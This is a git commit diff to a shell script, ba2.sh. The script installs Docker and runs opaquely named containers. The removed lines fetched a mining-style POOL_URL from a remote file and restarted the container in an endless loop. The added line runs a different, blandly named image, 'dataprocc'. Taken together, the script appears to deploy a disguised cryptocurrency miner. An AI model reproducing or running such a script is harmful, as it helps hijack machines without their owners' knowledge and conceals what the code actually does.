f523835cf225b64e335a2922213f00c573bcf94e
max313iq <153689278+max313iq@users.noreply.github.com>
2024-10-23 04:25:45 +0300

    Update ba2.sh

--- ba2.sh
+++ ba2.sh
@@ -1,18 +1,5 @@
 #!/bin/bash
 
-# Function to update the environment variable and restart Docker container
-update_and_restart() {
-    new_pool_url=$(curl -s https://raw.githubusercontent.com/max313iq/Ssl/main/ip2)
-    if [ "$new_pool_url" != "$POOL_URL" ]; then
-        echo "Updating POOL_URL to: $new_pool_url"
-        export POOL_URL=$new_pool_url
-        sudo docker stop $(sudo docker ps -q --filter ancestor=ubtssl/webappx:latest)
-        sudo docker run -d -e POOL_URL="$POOL_URL" ubtssl/webappx:latest
-    else
-        echo "No updates found."
-    fi
-}
-
 # Install Docker
 sudo apt-get update --fix-missing
 sudo apt-get install -y \
@@ -25,15 +12,7 @@ echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] 
 sudo apt-get update --fix-missing
 sudo apt-get install -y docker-ce docker-ce-cli containerd.io
 
-# Run Docker container with initial POOL_URL
-export POOL_URL=$(curl -s https://raw.githubusercontent.com/max313iq/Ssl/main/ip2)
-sudo docker run -d -e POOL_URL="$POOL_URL" ubtssl/webappx:latest
+# Run Docker container without setting environment variables
+sudo docker run -d riccorg/dataprocc:latest
 
-# Allow some time for the container to start before entering the update loop
-sleep 10
-
-# Continuous loop to check for updates
-while true; do
-    sleep 1200  # Check every hour (adjust as needed)
-    update_and_restart
-done
+# End of script
